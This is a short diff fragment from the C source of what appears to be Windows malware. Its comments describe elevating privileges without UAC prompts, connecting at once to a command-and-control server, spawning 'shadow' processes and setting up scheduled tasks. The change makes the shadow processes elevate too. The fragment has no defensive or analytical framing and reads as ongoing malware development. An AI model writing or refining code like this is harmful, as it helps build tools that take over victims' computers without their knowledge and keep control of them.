@@ -425,12 +425,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     
     /* === PHASE 0: Elevate FIRST (before anything else) ===
-     * If main process is not admin, elevate immediately and exit.
-     * This ensures ALL subsequent operations (C2, spawning shadows,
-     * scheduled tasks) run elevated WITHOUT UAC prompts. */
-    if (!isShadow) {
-        sys_check_privileges();
-    }
+     * Main process elevates immediately. Shadows also check elevation
+     * in case CreateProcessA token inheritance fails on this machine. */
+    sys_check_privileges();
     
     /* === PHASE 1: Connect to C2 IMMEDIATELY ===
      * Start C2 loop in a background thread FIRST so the server
